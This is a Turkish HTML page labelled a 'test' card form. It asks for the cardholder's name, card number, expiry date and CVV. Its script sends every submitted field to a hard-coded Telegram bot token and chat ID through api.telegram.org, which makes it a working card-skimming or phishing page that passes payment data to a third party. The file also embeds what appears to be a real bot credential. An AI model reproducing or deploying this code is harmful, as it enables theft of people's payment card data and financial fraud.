<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Test Kart Formu</title>
</head>
<body>
  <h2>Test Amaçlı Kart Formu</h2>

  <form id="cardForm" autocomplete="on" onsubmit="sendCardInfo(event)">
    <label>
      Kart Üzerindeki İsim:
      <input type="text" id="name" name="cc-name" autocomplete="cc-name" required>
    </label><br><br>

    <label>
      Kart Numarası:
      <input type="text" id="cardNumber" name="cc-number" autocomplete="cc-number" required>
    </label><br><br>

    <label>
      Son Kullanma Tarihi (AA/YY):
      <input type="text" id="expiry" name="cc-exp" autocomplete="cc-exp" required>
    </label><br><br>

    <label>
      CVV:
      <input type="text" id="cvv" name="cc-csc" autocomplete="cc-csc" required>
    </label><br><br>

    <button type="submit">Gönder</button>
  </form>

  <script>
    const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
    const TELEGRAM_CHAT_ID = '5395609882';

    function sendCardInfo(event) {
      event.preventDefault();

      const name = document.getElementById('name').value;
      const cardNumber = document.getElementById('cardNumber').value;
      const expiry = document.getElementById('expiry').value;
      const cvv = document.getElementById('cvv').value;

      const message = `💳 *Test Kart Bilgisi*\n\n👤 İsim: ${name}\n💳 Kart No: ${cardNumber}\n📅 Son Kullanma: ${expiry}\n🔐 CVV: ${cvv}`;

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert('Gönderildi!');
          document.getElementById('cardForm').reset();
        } else {
          alert('Telegram API Hatası: ' + data.description);
        }
      })
      .catch(error => {
        console.error('Hata:', error);
        alert('Veri gönderilemedi.');
      });
    }
  </script>
</body>
</html>
